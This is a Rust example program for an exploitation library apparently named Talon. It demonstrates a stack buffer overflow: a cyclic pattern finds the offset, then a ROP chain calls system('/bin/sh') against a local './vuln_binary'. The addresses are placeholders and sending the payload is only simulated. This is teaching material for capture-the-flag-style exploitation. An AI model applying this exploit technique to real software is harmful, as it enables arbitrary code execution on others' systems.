// TALON EXAMPLE 1: Basic PWN - Buffer Overflow with ROP
// Demonstrates: Cyclic patterns, ROP chains, packing

use talon::cyclic_tools::{cyclic, cyclic_find};
use talon::packing_tools::{p64, u64};
use talon::rop_tools::RopChain;
use talon::interactive_io::Process;

fn main() -> Result<(), String> {
    println!("[*] Talon PWN Example: Buffer Overflow + ROP");
    
    // Step 1: Find offset using cyclic pattern
    let pattern = cyclic(500);
    println!("[+] Generated {} byte cyclic pattern", pattern.len());
    
    // Simulate crashed EIP/RIP value (in real scenario, from debugger)
    let crashed_rip = 0x6161616c6161616b_u64; // 'kaaalaaa'
    let offset = cyclic_find(crashed_rip)?;
    println!("[+] Buffer overflow offset: {} bytes", offset);
    
    // Step 2: Build ROP chain
    let mut rop = RopChain::new("./vuln_binary")?;
    
    // Find useful gadgets
    let pop_rdi = rop.find_gadget("pop rdi; ret")
        .ok_or("pop rdi gadget not found")?;
    let pop_rsi = rop.find_gadget("pop rsi; ret")
        .ok_or("pop rsi gadget not found")?;
    
    println!("[+] pop rdi gadget: 0x{:x}", pop_rdi);
    println!("[+] pop rsi gadget: 0x{:x}", pop_rsi);
    
    // Build exploit payload
    let mut payload = vec![b'A'; offset];
    
    // ROP chain: call system("/bin/sh")
    let binsh_addr = 0x00601000_u64; // Address of "/bin/sh" string
    let system_addr = 0x00400500_u64; // Address of system() function
    
    payload.extend_from_slice(&p64(pop_rdi));
    payload.extend_from_slice(&p64(binsh_addr));
    payload.extend_from_slice(&p64(system_addr));
    
    println!("[+] Exploit payload: {} bytes", payload.len());
    
    // Step 3: Send exploit (simulated)
    println!("[*] Payload would be sent to target here");
    println!("[*] In real scenario:");
    println!("    let mut proc = Process::new(\"./vuln_binary\", vec![])?;");
    println!("    proc.sendline(&payload)?;");
    println!("    proc.interactive()?;");
    
    Ok(())
}
